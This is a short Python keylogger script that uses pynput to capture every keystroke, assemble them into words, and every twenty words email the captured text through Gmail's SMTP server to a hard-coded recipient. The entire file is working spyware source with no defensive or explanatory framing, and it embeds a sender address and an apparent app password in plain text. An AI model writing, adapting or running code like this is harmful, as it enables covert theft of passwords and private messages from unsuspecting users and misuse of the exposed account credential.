from pynput import keyboard
import string
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


def crearEmail(texto):
    msg = MIMEMultipart()
    msg['From'] = 'fuenteroja.f@gmail.com'
    msg['To'] = 'rojasfuentesfc@gmail.com'
    msg['Subject'] = 'Keylogger'

    email = MIMEText(texto, 'plain')

    msg.attach(email)

    mailServer = smtplib.SMTP('smtp.gmail.com', 587)
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login('fuenteroja.f@gmail.com', 'jtwetbnbzbyxvels')

    mailServer.sendmail('fuenteroja.f@gmail.com', 'rojasfuentesfc@gmail.com', msg.as_string())

    mailServer.close()


printable_chars = set(
    string.printable + 
    "\n\r\t" +
    "".join([chr(i) for i in range(32, 127)])
)

current_word = ""
word_formed = 0
word_list = []


def on_press(key):
    global current_word, word_formed, word_list
    try:
        key_value = key.char
    except:
        key_value = str(key)

    if key == keyboard.Key.space:
        current_word = current_word.strip()
        if len(current_word) > 0:
            word_formed += 1
            word_list.append(current_word)
            current_word = ""
            if word_formed % 20 == 0:
                crearEmail('\n'.join(word_list))
                word_list = []
    elif key_value in printable_chars:
        current_word += key_value


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
